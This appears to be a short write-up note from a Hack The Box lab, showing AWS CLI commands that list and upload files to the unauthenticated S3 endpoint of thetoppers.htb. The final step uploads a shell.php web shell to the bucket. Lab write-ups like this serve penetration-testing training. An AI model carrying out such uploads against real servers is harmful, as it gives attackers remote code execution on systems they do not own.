

```powershell

# 1. Install AWS CLI Tool
sudo apt install awscli

```


First, we need to configure it using the following command.
We will be using an arbitrary value for all the fields, as sometimes the server is configured to not check
authentication (still, it must be configured to something for aws to work).

![[Pasted image 20251219212913.png]]


```powershell
# list s3 bucket:
aws --endpoint=http://s3.thetoppers.htb s3 ls

# list objects in a bucket
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb


# upload a file (Shell.php)
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb



```